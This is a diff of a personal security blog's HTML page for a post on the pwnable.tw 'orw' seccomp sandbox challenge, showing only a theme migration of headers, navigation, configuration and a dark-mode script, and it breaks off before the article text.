@@ -1,310 +1,629 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
-<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Kylinxin, security, Web3, Rust, pwn, CTF">
+    
+    
+    <meta name="author" content="Kylinxin">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
 
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+                // Try immediately
+                if (addBodyClass()) return;
 
-<link rel="stylesheet" href="/css/main.css?v=linear-verge-20260603c">
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 
-
-
-<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free@7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://unpkg.com/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"kylinxin.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null,"show_result":true},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":3,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js" defer></script>
-
-    <meta name="description" content="初探（Linux Kernel）sandbox中的prctl-seccomp机制（orw） 题目来源：https:&#x2F;&#x2F;pwnable.tw&#x2F;challenge&#x2F;#2（orw）参考资料：https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;186447https:&#x2F;&#x2F;man7.org&#x2F;linux&#x2F;man-pages&#x2F;man2&#x2F;prctl.2.htmlhttps:&#x2F;&#x2F;blog.betama">
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://kylinxin.github.io/2023/07/23/prctl-seccomp/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Kylinxin&#39;s notes on security, Web3, systems, and programming.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="prctl-seccomp-orw">
 <meta property="og:url" content="https://kylinxin.github.io/2023/07/23/prctl-seccomp/index.html">
 <meta property="og:site_name" content="Kylinxin&#39;s Blog">
-<meta property="og:description" content="初探（Linux Kernel）sandbox中的prctl-seccomp机制（orw） 题目来源：https:&#x2F;&#x2F;pwnable.tw&#x2F;challenge&#x2F;#2（orw）参考资料：https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;186447https:&#x2F;&#x2F;man7.org&#x2F;linux&#x2F;man-pages&#x2F;man2&#x2F;prctl.2.htmlhttps:&#x2F;&#x2F;blog.betama">
+<meta property="og:description" content="Kylinxin&#39;s notes on security, Web3, systems, and programming.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s2.loli.net/2023/09/14/6MpQe2EbhANUcPH.png">
+<meta property="og:image" content="https://kylinxin.github.io/images/faction/1.png">
 <meta property="article:published_time" content="2023-07-23T07:14:29.000Z">
 <meta property="article:modified_time" content="2023-07-23T07:14:29.000Z">
 <meta property="article:author" content="Kylinxin">
 <meta property="article:tag" content="orw">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s2.loli.net/2023/09/14/6MpQe2EbhANUcPH.png">
+<meta name="twitter:image" content="https://kylinxin.github.io/images/faction/1.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/favicon.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            prctl-seccomp-orw | Kylinxin&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
 
 
-<link rel="canonical" href="https://kylinxin.github.io/2023/07/23/prctl-seccomp/">
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://kylinxin.github.io/2023/07/23/prctl-seccomp/","path":"2023/07/23/prctl-seccomp/","title":"prctl-seccomp-orw"}</script>
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
 
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>prctl-seccomp-orw | Kylinxin's Blog</title>
-  
+    
 
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
 
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
 
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
 
+    <script id="hexo-configurations">
+    window.config = {"hostname":"kylinxin.github.io","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.75,"image_border_radius":"10px","image_alignment":"center","image_caption":true,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3rem","h2":"2.4rem","h3":"1.9rem","h4":"1.5rem","h5":"1.25rem","h6":"1.1rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["Kylinxin"]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"tokyo-night-dark"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":"#2F4858","default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1120px","sidebar_width":"240px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":false,"site_uv":false,"post_pv":false},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/faction/1.png","description":"Kylinxin's notes on security, Web3, systems, and programming."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Kylinxin's Blog","subtitle":{"text":["Security notes, exploit writeups, and engineering traces.","Web3, Rust, systems, and learning records.","Write, break, rebuild, and document."],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":70,"backing_speed":45,"starting_delay":350,"backing_delay":1800,"loop":true,"smart_backspace":true},"text_color":{"light":"#ffffff","dark":"#f4efe7"},"text_style":{"title_size":"3rem","subtitle_size":"1.25rem","line_height":1.25},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"center","links":[{"icon":"fa-brands fa-github","url":"https://github.com/Kylinxin"},{"icon":"fa-solid fa-rss","url":"/atom.xml"},{"icon":"fa-solid fa-at","url":null},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":[{"icon":"fa-brands fa-weixin","qr":null},{"icon":"/images/custom-icon.svg","qr":null}]}},"plugins":{"feed":{"enable":true},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#141821","right":"#A31F34","transparency":28},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives/","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder-open"},"Tags":{"path":"/tags/","icon":"fa-regular fa-tags"},"Friends":{"path":"/friends/","icon":"fa-regular fa-link"},"About":{"path":"/about/","icon":"fa-regular fa-user"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":3,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"info","announcement":"CTF / Pwn / Web3 / Rust / notes","show_on_mobile":true,"links":{"GitHub":{"path":"https://github.com/Kylinxin","icon":"fa-brands fa-github"},"RSS":{"path":"/atom.xml","icon":"fa-solid fa-rss"}}},"article_date_format":"YYYY-MM-DD","excerpt_length":260,"categories":{"enable":true,"limit":4},"tags":{"enable":true,"limit":5}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-shield-halved\" style=\"color: #A31F34\"></i>","start":"2023/4/9 00:00:00","statistics":true,"customize":"Built with Hexo and Redefine.","icp":{"enable":false,"number":null,"url":null}},"footerStart":"2023/4/9 00:00:00","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.i18n = {"search":"站内搜索您需要的内容...","toc":"目录","prev":"上一页","next":"下一页","prev_posts":"上一篇","next_posts":"下一篇","page":"第 %d 页","recent_posts":"最新文章","share":"分享","powered_by":"由 %s 驱动","theme":"主题","rss_feed":"RSS Feed","category":"分类","categories":"分类","tag":"标签","tags":"标签","post":"文章","posts":"文章","tagcloud":"标签云","comment":"评论","comments":"评论","top":"置顶","sticky":"置顶","go-back-home":"回到首页","masonry_loading":"照片加载中...","image_viewer":"图片查看器","close":"关闭","exif":{"title":"EXIF","cards":{"camera":"相机","lens":"镜头","exposure":"曝光","other":"其他"},"fields":{"make":"品牌","model":"机型","date_taken":"拍摄时间","lens_model":"镜头","focal_length":"焦距","focus_mode":"对焦模式","shutter":"快门","aperture":"光圈","iso":"感光度","exposure_program":"曝光程序","exposure_compensation":"曝光补偿","metering_mode":"测光模式","flash":"闪光灯","white_balance":"白平衡","latitude":"纬度","longitude":"经度","altitude":"海拔"},"status":{"loading":"加载中...","no_exif":"无 EXIF 信息","library_missing":"EXIF 库未加载","image_source_missing":"图片地址不可用","unavailable":"EXIF 不可用（可能被 CORS 阻止或缺少元数据）","flag_unavailable":"EXIF 不可用"}},"home":"首页","archive":"归档","archives":"归档","about":"关于","links":"链接","link":"链接","friends":"友情链接","friend":"友情链接","timeline":"时间轴","shuoshuo":"说说","bookmarks":"书签","site_uv":"访问人数","site_pv":"总访问量","read_more":"阅读全文","wordcount":"字","min2read":"分钟","changelog":"更新日志","status":"状态","runtime":"博客已运行","days":"天","hours":"小时","minutes":"分钟","seconds":"秒","optimized_by":"并由 Evan 进行优化","rights":"版权所有","site_posts":"共撰写了 %s 篇文章","site_wordcount":"共 %s 字","copyright":{"title":"标题","author":"作者","link":"链接","create_time":"创建于","update_time":"更新于","license_title":"版权声明","license_content":"本文章采用 %s 进行许可。","all_rights_reserved":"版权所有 &#169 %s，禁止转载。","public_domain":"本文为公有领域作品，可自由转载、引用。"},"ago":{"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"},"create_time":"创建","update_time":"更新","expired":"这篇文章最后更新于 %s 天前，内容可能已经过时。"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
 
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
 
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
 
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
 
-  
-  <script src="https://unpkg.com/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
-<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
-
-  <script src="https://unpkg.com/hexo-generator-searchdb@1.5.0/dist/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
-<script src="/js/third-party/search/local-search.js" defer></script>
-
-
-
-
-
-
-
-  
-
-
-
-
-
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-<link rel="alternate" href="/atom.xml" title="Kylinxin's Blog" type="application/atom+xml">
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Kylinxin's Blog" type="application/atom+xml">
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
 
-  <main class="main">
-    <div class="column">
-      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
 
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <p class="site-title">Kylinxin's Blog</p>
-      <i class="logo-line"></i>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger" aria-label="搜索" role="button">
-        <i class="fa fa-search fa-fw fa-lg"></i>
-    </div>
-  </div>
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
 </div>
 
+<main class="page-container" id="swup">
 
+	
 
-<nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-</nav>
-
-
-
-  <div class="search-pop-overlay">
-    <div class="popup search-popup">
-      <div class="search-header">
-        <span class="search-icon">
-          <i class="fa fa-search"></i>
-        </span>
-        <div class="search-input-container">
-          <input autocomplete="off" autocapitalize="off" maxlength="80"
-                placeholder="搜索..." spellcheck="false"
-                type="search" class="search-input">
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Kylinxin&#39;s Blog
+                
+            </a>
         </div>
-        <span class="popup-btn-close" role="button">
-          <i class="fa fa-times-circle"></i>
-        </span>
-      </div>
-      <div class="search-result-container">
-        <div class="search-result-icon">
-          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives/"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-regular fa-folder-open fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/friends/"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    友情链接
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about/"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
         </div>
-      </div>
     </div>
-  </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives/"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder-open fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/friends/"
+                        >
+                            <span>
+                                友情链接
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about/"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           target="_blank" rel="noopener" href="https://github.com/Kylinxin"
+                        >
+                            <span>GitHub</span>
+                            <i class="fa-brands fa-github fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/atom.xml"
+                        >
+                            <span>RSS</span>
+                            <i class="fa-solid fa-rss fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">44</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">60</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
 
 </header>
-        
-  
-  <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
 
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%9D%E6%8E%A2%EF%BC%88Linux-Kernel%EF%BC%89sandbox%E4%B8%AD%E7%9A%84prctl-seccomp%E6%9C%BA%E5%88%B6%EF%BC%88orw%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">初探（Linux Kernel）sandbox中的prctl-seccomp机制（orw）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#prctl-seccomp-%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">prctl-seccomp 简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8seccomp-tools%E6%9F%A5%E7%9C%8B%E5%8F%AF%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%88%E8%AF%86%E5%88%AB%E6%B2%99%E7%AE%B1%E8%A7%84%E5%88%99%EF%BC%89"><span class="nav-number">1.2.</span> <span class="nav-text">使用seccomp-tools查看可用系统调用（识别沙箱规则）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#prctl%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B"><span class="nav-number">1.3.</span> <span class="nav-text">prctl函数原型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BPF-%E8%A7%84%E5%88%99%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.4.</span> <span class="nav-text">BPF 规则介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E8%A7%A3%E9%A2%98"><span class="nav-number">1.5.</span> <span class="nav-text">开始解题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#prctl%E6%98%AF%E5%90%A6%E8%83%BD%E7%BB%95%E8%BF%87%EF%BC%9F"><span class="nav-number">1.6.</span> <span class="nav-text">prctl是否能绕过？</span></a></li></ol></li></ol></div>
-        </div>
-        <!--/noindex-->
+		</div>
 
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Kylinxin"
-      src="/images/faction/1.png">
-  <p class="site-author-name" itemprop="name">Kylinxin</p>
-  <div class="site-description" itemprop="description">Kylinxin's Blog</div>
-</div>
-<div class="site-state-wrap animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">60</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-          <a href="/categories/">
-        <span class="site-state-item-count">14</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">44</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author animated">
-      <span class="links-of-author-item">
-        <a href="https://github.com/Kylinxin" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Kylinxin" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-  </div>
+		<div class="main-content-body transition-fade-up">
+			
 
-        </div>
-      </div>
-    </div>
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
 
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">prctl-seccomp-orw</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/faction/1.png">
+			</div>
